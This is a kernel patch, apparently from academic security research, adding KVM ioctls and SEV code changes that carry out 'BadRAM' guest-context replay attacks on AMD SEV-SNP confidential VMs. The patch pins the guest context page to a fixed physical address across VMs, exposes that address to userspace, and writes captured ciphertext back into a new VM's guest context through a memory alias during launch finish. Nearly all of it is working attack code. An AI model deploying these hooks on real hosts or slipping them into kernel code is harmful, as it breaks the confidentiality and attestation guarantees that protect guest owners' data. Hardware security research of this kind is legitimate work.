@@ -1,0 +1,484 @@
+From 0adb2f69c4be7856754ccd8287f556b76aecdcbe Mon Sep 17 00:00:00 2001
+From: Luca Wilke <l.wilke@uni-luebeck.de>
+Date: Tue, 2 Apr 2024 09:09:59 +0200
+Subject: [PATCH 4/4] Implemented kernel support for badram guest context
+ replay attacks
+
+- Fixate the physical address of the guest contxt for sequentially started VM's. This allows us to capture and replay ciphertexts.  The KVM_BADRAM_GET_GCTX_PA ioctl can be used to retrieve it. The replay can be done via the usual userspace + raw mem access method
+
+- If the guet uses an id block durign launch, we need to perform replay in the kernel, as snp_launch_finish will finalize the vCPU measurements and thus again update the measurment in the guest context. The KVM_BADRAM_REPLAY_GCTX ioctl can be used to request the replay
+---
+ arch/x86/kvm/badram.c    |  53 ++++++++++++++++
+ arch/x86/kvm/svm/sev.c   | 130 +++++++++++++++++++++++++++++++++++++--
+ include/linux/badram.h   |  62 +++++++++++++++++++
+ include/uapi/linux/kvm.h |  33 ++++++++++
+ virt/kvm/kvm_main.c      |  66 ++++++++++++++++++++
+ 5 files changed, 338 insertions(+), 6 deletions(-)
+
+diff --git a/arch/x86/kvm/badram.c b/arch/x86/kvm/badram.c
+index 0b9f0b636d3a..49b69ec72113 100644
+--- a/arch/x86/kvm/badram.c
++++ b/arch/x86/kvm/badram.c
+@@ -2,6 +2,55 @@
+ #include "linux/export.h"
+ #include "linux/spinlock_types.h"
+ 
++// Manipulated by the XXX_svm_details functions and protected by the
++// svm_details_lock. This is private to this compilation unit so that all
++// manipulations have to go through the functions.
++struct list_head svm_details_list = LIST_HEAD_INIT(svm_details_list);
++
++DEFINE_SPINLOCK(svm_details_lock);
++EXPORT_SYMBOL(svm_details_lock);
++
++
++
++int add_svm_details(svm_details_t* v) {
++  if( get_svm_details(v->kvm)) {
++    printk("%s:%d %s : entry already exists", __FILE__, __LINE__, __FUNCTION__);
++    return -1;
++  }
++  INIT_LIST_HEAD(&(v->list));
++  list_add(&(v->list), &svm_details_list);
++  return 0;
++}
++EXPORT_SYMBOL(add_svm_details);
++
++svm_details_t* get_svm_details(struct kvm* kvm) {
++  struct list_head* pos;
++  svm_details_t* e;
++  list_for_each(pos, &svm_details_list) {
++    e = list_entry(pos, svm_details_t, list);
++    if( e->kvm == kvm ) {
++      return e;
++    }
++  }
++  return NULL;
++}
++EXPORT_SYMBOL(get_svm_details);
++
++int remove_svm_details(struct kvm* kvm) {
++  svm_details_t* e;
++  e = get_svm_details(kvm);
++  if(!e) {
++    printk("%s:%d %s : entry does not exist", __FILE__, __LINE__, __FUNCTION__);
++    return -1;
++  }
++  list_del(&(e->list));
++  kfree(e);
++  return 0;
++}
++EXPORT_SYMBOL(remove_svm_details);
++
++
++
+ 
+ DEFINE_SPINLOCK(badram_remap_req_lock);
+ EXPORT_SYMBOL(badram_remap_req_lock);
+@@ -20,3 +69,7 @@ EXPORT_SYMBOL(badram_pause_vm);
+ DEFINE_SPINLOCK(badram_pause_vm_lock);
+ EXPORT_SYMBOL(badram_pause_vm_lock);
+ 
++badram_gctx_replay_t badram_gctx_replay = {0};
++EXPORT_SYMBOL(badram_gctx_replay);
++DEFINE_SPINLOCK(badram_gctx_replay_lock);
++EXPORT_SYMBOL(badram_gctx_replay_lock);
+diff --git a/arch/x86/kvm/svm/sev.c b/arch/x86/kvm/svm/sev.c
+index 681ab6778547..d2ff183e36c3 100644
+--- a/arch/x86/kvm/svm/sev.c
++++ b/arch/x86/kvm/svm/sev.c
+@@ -34,6 +34,8 @@
+ #include "cpuid.h"
+ #include "trace.h"
+ 
++#include "linux/badram.h"
++
+ #ifndef CONFIG_KVM_AMD_SEV
+ /*
+  * When this config is not defined, SEV feature is not supported and APIs in
+@@ -1950,6 +1952,23 @@ int sev_vm_move_enc_context_from(struct kvm *kvm, unsigned int source_fd)
+ 	return ret;
+ }
+ 
++/* Explanation for badram_fixed_gctx_XXX stuff
++ * 
++ * The guet context page is allocated by the kernel. For our guest context
++   replay attacks, we require that after terminating VM A, a new VM B will
++   use the same physical address for its guest context page. The page will
++   be re-initialized but since it uses the same encryption key, we can replay
++   previously captured ciphertext.
++*/
++
++// Upon the first snp_context_create snp_context_create, we store the address
++// of the allocated guest context here. Currently, this is never freed.
++static void* badram_fixed_gctx_vaddr = NULL;
++// This tracks if badram_fixed_gctx_vaddr is used. It should either be 0 or 1.
++// If we create a new VM we will only use badram_fixed_gctx_vaddr if no one else
++// is currently using it
++static int badram_fixed_gctx_refcount = 0;
++
+ /*
+  * The guest context contains all the information, keys and metadata
+  * associated with the guest that the firmware tracks to implement SEV
+@@ -1962,10 +1981,27 @@ static void *snp_context_create(struct kvm *kvm, struct kvm_sev_cmd *argp)
+ 	void *context;
+ 	int rc;
+ 
+-	/* Allocate memory for context page */
+-	context = snp_alloc_firmware_page(GFP_KERNEL_ACCOUNT);
+-	if (!context)
+-		return NULL;
++	//Only use our fixed guest context page if no one else is using it
++	if(badram_fixed_gctx_vaddr  && badram_fixed_gctx_refcount == 0) {
++		badram_fixed_gctx_refcount += 1;
++		printk("%s:%d %s : Using badram_fixed_gctx_pa with refcount = %d\n",
++			__FILE__, __LINE__, __FUNCTION__, badram_fixed_gctx_refcount);
++		context = badram_fixed_gctx_vaddr;
++	} else { //Otherwise, return newly allocated guest context
++		printk("%s:%d %s : Using regular allocator. fixed_gctx = 0x%llx, refcount = %d\n",
++			__FILE__, __LINE__, __FUNCTION__, (uint64_t)badram_fixed_gctx_vaddr ,badram_fixed_gctx_refcount);
++		/* Allocate memory for context page */
++		context = snp_alloc_firmware_page(GFP_KERNEL_ACCOUNT);
++		if (!context) {
++			return NULL;
++		}
++		//If this is the first time we allocate a guest context, use this as
++		//our fixed guest context
++		if(!badram_fixed_gctx_vaddr) {
++			badram_fixed_gctx_vaddr = context;
++			badram_fixed_gctx_refcount += 1;
++		}
++	}
+ 
+ 	data.address = __psp_pa(context);
+ 	rc = __sev_issue_cmd(argp->sev_fd, SEV_CMD_SNP_GCTX_CREATE, &data, &argp->error);
+@@ -1992,6 +2028,7 @@ static int snp_launch_start(struct kvm *kvm, struct kvm_sev_cmd *argp)
+ 	struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
+ 	struct sev_data_snp_launch_start start = {0};
+ 	struct kvm_sev_snp_launch_start params;
++	svm_details_t* svm_details;
+ 	int rc;
+ 
+ 	if (!sev_snp_guest(kvm))
+@@ -2008,6 +2045,26 @@ static int snp_launch_start(struct kvm *kvm, struct kvm_sev_cmd *argp)
+ 	if (!sev->snp_context)
+ 		return -ENOTTY;
+ 
++	/* 
++	 * Make the guest context PA available in the kvm module
++	 * 
++	 * We are currently in the kvm_amd module but we need this information
++	 * in the kvm module. However, we cannot import stuff from kvm_amd into kvm
++	 * as this would lead to a cyclic module dependency. Thus, we use this
++	 * dedicated data structure from the kvm module to store the required information
++	*/
++	svm_details = kmalloc(sizeof(svm_details_t),GFP_KERNEL);
++	svm_details->kvm = kvm;
++	svm_details->gctx_pa = __pa(sev->snp_context);
++	spin_lock(&svm_details_lock);
++	if( add_svm_details(svm_details)) {
++		pr_err("Failed to add entry to svm_details_list\n");
++		spin_unlock(&svm_details_lock);
++		kfree(svm_details);
++		return -EINVAL;
++	}
++	spin_unlock(&svm_details_lock);
++
+ 	if (params.policy & SNP_POLICY_MASK_SINGLE_SOCKET) {
+ 		pr_warn("SEV-SNP hypervisor does not support limiting guests to a single socket.");
+ 		return -EINVAL;
+@@ -2243,6 +2300,25 @@ static int snp_launch_update_vmsa(struct kvm *kvm, struct kvm_sev_cmd *argp)
+ 	return 0;
+ }
+ 
++/**
++ @brief Map PA via memremap and copy content of data to it
++ @return 0 on success
++*/
++static int raw_memcpy_to_pa(uint64_t pa, uint8_t* data, uint64_t len) {
++	void* mapping =  memremap(pa, PAGE_SIZE, MEMREMAP_WB | MEMREMAP_WT | MEMREMAP_WC | MEMREMAP_ENC | MEMREMAP_DEC);
++	if(!mapping){
++		printk("%s:%d %s : failed to map 0x%llx\n", __FILE__, __LINE__, __FUNCTION__, pa);
++		return -1;
++	}
++
++	wbinvd_on_all_cpus();
++	memcpy(mapping, data , len );
++	wbinvd_on_all_cpus();
++
++	memunmap(mapping);
++	return 0;
++}
++
+ static int snp_launch_finish(struct kvm *kvm, struct kvm_sev_cmd *argp)
+ {
+ 	struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
+@@ -2291,6 +2367,31 @@ static int snp_launch_finish(struct kvm *kvm, struct kvm_sev_cmd *argp)
+ 			data->auth_key_en = 1;
+ 	}
+ 
++	//If requested perform the replay
++	spin_lock(&badram_gctx_replay_lock);
++	if(badram_gctx_replay.do_replay) {
++		uint64_t gctx_pa = __pa(sev->snp_context);
++		badram_gctx_replay_t* r = &badram_gctx_replay;
++
++		if(gctx_pa == r->expected_gctx_pa ) {
++			uint64_t pa = r->gctx_alias_pa + r->gctx_offset;
++			if( raw_memcpy_to_pa(pa, r->data, r->data_len)) {
++				printk("%s:%d %s : raw_memcpy_to_pa for pa 0x%llx failed\n",
++					__FILE__, __LINE__, __FUNCTION__, pa);
++			} else {
++				printk("%s:%d %s : repleayed 0x%llx bytes to pa 0x%llx\n",
++					__FILE__, __LINE__, __FUNCTION__, r->data_len, pa);
++			}
++		} else {
++			printk("%s:%d %s : expected gctx to bet at 0x%llx but it is at 0x%llx\n",
++				__FILE__, __LINE__, __FUNCTION__, r->expected_gctx_pa, gctx_pa);
++		}
++
++		badram_gctx_replay.do_replay = 0;
++		vfree(badram_gctx_replay.data);
++	}
++	spin_unlock(&badram_gctx_replay_lock);
++
+ 	memcpy(data->host_data, params.host_data, KVM_SEV_SNP_FINISH_DATA_SIZE);
+ 	data->gctx_paddr = __psp_pa(sev->snp_context);
+ 	ret = sev_issue_cmd(kvm, SEV_CMD_SNP_LAUNCH_FINISH, data, &argp->error);
+@@ -2617,8 +2718,20 @@ static int snp_decommission_context(struct kvm *kvm)
+ 
+ 	up_write(&sev_deactivate_lock);
+ 
+-	/* free the context page now */
+-	snp_free_firmware_page(sev->snp_context);
++	//Only free the context page if it is not our fixed gctx page
++	//For the fixed gctx page, decrease the refcount value by one
++	if(badram_fixed_gctx_vaddr == sev->snp_context) {
++		printk("%s:%d %s : not freeing fixed gctx\n", __FILE__, __LINE__, __FUNCTION__);
++		badram_fixed_gctx_refcount -= 1;
++		if(badram_fixed_gctx_refcount < 0) {
++			printk("%s:%d %s : badram_fixed_gctx_refcount dropped below zero!\n",
++				__FILE__, __LINE__, __FUNCTION__);
++		}
++	} else {
++		printk("%s:%d %s : regular deallocation\n", __FILE__, __LINE__, __FUNCTION__);
++		/* free the context page now */
++		snp_free_firmware_page(sev->snp_context);
++	}
+ 	sev->snp_context = NULL;
+ 
+ 	return 0;
+@@ -2670,6 +2783,11 @@ void sev_vm_destroy(struct kvm *kvm)
+ 			WARN_ONCE(1, "Failed to free SNP guest context, leaking asid!\n");
+ 			return;
+ 		}
++		spin_lock(&svm_details_lock);
++		if( remove_svm_details(kvm)) {
++			printk("%s:%d %s : Failed to remove svm_details entry\n", __FILE__, __LINE__, __FUNCTION__);
++		}
++		spin_unlock(&svm_details_lock);
+ 	} else {
+ 		sev_unbind_asid(kvm, sev->handle);
+ 	}
+diff --git a/include/linux/badram.h b/include/linux/badram.h
+index ea88b692a91c..340025695215 100644
+--- a/include/linux/badram.h
++++ b/include/linux/badram.h
+@@ -4,7 +4,44 @@
+ #include "linux/kvm_host.h"
+ #include <linux/spinlock_types.h>
+ #include <linux/types.h>
++#include <linux/list.h>
+ 
++//lock for the XXX_svm_details functions that manipulate 
++// the svm_details_list object that is defined in badram.c
++extern spinlock_t svm_details_lock;
++
++//Stores internal information about the VM for the given kvm struct
++//that would otherwise not be accessible from this subsytem
++typedef struct svm_details {
++	//identifies the VM for which this entry contains data
++	struct kvm* kvm;
++	//required to add this to the list data structure. initialized by add function
++	struct list_head list;
++	//physical address of the guest context page
++	uint64_t gctx_pa;
++} svm_details_t;
++
++/**
++ @brief Add entry to list. Caller must hold svm_details_lock. Fails if entry already exists.
++ @param v : caller must allocate with kmalloc and donates this to the list
++ @return 0 on success
++*/
++int add_svm_details(svm_details_t* v);
++
++/**
++ @brief Query the entry for kvm from the list. Caller must hold svm_details_lock.
++ * Returns pointer to internal datastructure, DO NOT free.
++ @returns pointer to entry or NULL if not found
++ * 
++*/
++svm_details_t* get_svm_details(struct kvm* kvm);
++
++/**
++ @brief Delete the entry for kvm from the list. If you previously queried via get_svm_details,
++ this will invalidate the returned pointer. Will fails if entry does not exists.
++ @returns 0 on success.
++*/
++int remove_svm_details(struct kvm* kvm);
+ 
+ typedef struct {
+ 	//specifies which npt entries we want to change
+@@ -45,4 +82,29 @@ typedef struct {
+ extern badram_pause_vm_t badram_pause_vm;
+ extern spinlock_t badram_pause_vm_lock;
+ 
++/**
++ * @brief Information for guest context replay upon snp_launch_finish
++ Filled in kvm_main via an ioctl and consumed in arch/x86/kvm/svm/sev.c
++ * 
++ */
++typedef struct {
++	//if 1, do replay on next snp_launch_finish
++	bool do_replay;
++	// data that should be replayed
++	uint8_t* data;
++	//length of data
++	uint64_t data_len;
++	//offset inside the guest context page where data should get copied
++	//for sev, this must be 16 byte aligned
++	uint64_t gctx_offset;
++	//used to sanity check the guest context PA
++	uint64_t expected_gctx_pa;
++	//badram alias for the guest context PA
++	uint64_t gctx_alias_pa;
++} badram_gctx_replay_t;
++extern badram_gctx_replay_t badram_gctx_replay;
++
++//lock for badram_gctx_replay
++extern spinlock_t badram_gctx_replay_lock;
++
+ #endif
+diff --git a/include/uapi/linux/kvm.h b/include/uapi/linux/kvm.h
+index 8fdefb30fa25..b4a7a12d62f4 100644
+--- a/include/uapi/linux/kvm.h
++++ b/include/uapi/linux/kvm.h
+@@ -1632,5 +1632,38 @@ struct kvm_badram_resume_vm_args {
+ };
+ #define KVM_BADRAM_RESUME_VM _IOWR(KVMIO, 0xda, struct kvm_badram_resume_vm_args)
+ 
++struct kvm_badram_get_gctx_args {
++	// pid of the QEMU process running the VM
++	uint64_t qemupid;
++	//Output parameter filled with the PA of the guest context page
++	uint64_t out_gctx_pa;
++};
++
++//Returns the physical address of the guest context page for the qemupid VM
++#define KVM_BADRAM_GET_GCTX_PA _IOWR(KVMIO, 0xdb, struct kvm_badram_get_gctx_args)
++
++
++struct badram_gctx_replay_args {
++	//userspace pointer to data that should get replayed
++	uint8_t* data;
++	//length of data
++	uint64_t data_len;
++	//offset inside the gctx page where we should replay
++	uint64_t gctx_offset;
++	//expected pa of the gctx. This is used as a sanity check
++	uint64_t expected_gctx_pa;
++	//alias for the gctx. We pass this as an argument to avoid pulling
++	//the computation logic into the kernel
++	uint64_t gctx_alias_pa;
++};
++
++/** @brief Requests that the kernel replays the given data to the VM's guest context page
++ * during snp_launch_finish.
++ *
++ * We need to do this in the kernel, because snp_launch_finish
++ * also calls snp_launch_update_vmsa. Thus, if we would replay from userspace before calling
++ * snp_launch_finish the snp_launch_update_vmsa would manipulate our replayed data.
++*/
++#define KVM_BADRAM_REPLAY_GCTX _IOWR(KVMIO, 0xdc, struct badram_gctx_replay_args)
+ 
+ #endif /* __LINUX_KVM_H */
+diff --git a/virt/kvm/kvm_main.c b/virt/kvm/kvm_main.c
+index 6ca8acb801c3..85110e0ba47b 100644
+--- a/virt/kvm/kvm_main.c
++++ b/virt/kvm/kvm_main.c
+@@ -5500,6 +5500,72 @@ static long kvm_dev_ioctl(struct file *filp,
+ 	int r = -EINVAL;
+ 
+ 	switch (ioctl) {
++	case KVM_BADRAM_REPLAY_GCTX: {
++			struct badram_gctx_replay_args params;
++			void __user *argp = (void __user *)arg;
++			uint8_t* replay_data;
++
++			if( copy_from_user(&params, argp, sizeof(params))) {
++				printk("%s:%d copy_from_user failed\n", __FILE__, __LINE__);
++				return -EINVAL;
++			}
++			replay_data = vmalloc(params.data_len);
++			if(copy_from_user(replay_data, params.data, params.data_len)) {		
++				printk("%s:%d copy_from_user failed\n", __FILE__, __LINE__);
++				return -EINVAL;
++			}
++
++			spin_lock(&badram_gctx_replay_lock);
++			badram_gctx_replay.data = replay_data;
++			badram_gctx_replay.data_len = params.data_len;
++			badram_gctx_replay.gctx_offset = params.gctx_offset;
++			badram_gctx_replay.expected_gctx_pa = params.expected_gctx_pa;
++			badram_gctx_replay.gctx_alias_pa = params.gctx_alias_pa;
++			
++			//Mark data as valid and trigger replay on next snp_launch_finish
++			badram_gctx_replay.do_replay = 1;
++			spin_unlock(&badram_gctx_replay_lock);
++
++
++				
++			r = 0;
++		}
++		break;
++	case KVM_BADRAM_GET_GCTX_PA: {
++				struct kvm_badram_get_gctx_args params;
++				struct kvm* kvm;
++				void __user *argp = (void __user *)arg;
++				svm_details_t* details;
++
++				//copy params and locate vm
++				if( copy_from_user(&params, argp, sizeof(params))) {
++					printk("%s:%d copy_from_user failed\n", __FILE__, __LINE__);
++					return -EINVAL;
++				}
++	
++				if( qemupid_to_kvm(params.qemupid, &kvm)) {
++					printk("%s:%d qemupid_to_kvm failed for qemupid %llu\n", __FILE__, __LINE__, params.qemupid);
++					return -EINVAL;
++				}
++
++				//lookup PA of guest context for the given VM via
++				//our data structure
++				spin_lock(&svm_details_lock);
++				if( !(details = get_svm_details(kvm))) {
++					printk("%s:%d failed to get svm_details entry\n", __FILE__, __LINE__);
++					spin_unlock(&svm_details_lock);
++					return -EINVAL;
++				}
++				spin_unlock(&svm_details_lock);
++				params.out_gctx_pa = details->gctx_pa;
++
++				if( copy_to_user(argp, &params, sizeof(params))) {
++						printk("%s:%d copy_to_user failed\n", __FILE__, __LINE__);
++						return -EINVAL;
++				}
++				r = 0;
++			}
++			break;
+ 	case KVM_BADRAM_PAUSE_VM: {
+ 				struct kvm_badram_pause_vm_args params;
+ 				struct kvm* kvm;
+-- 
+2.34.1
+
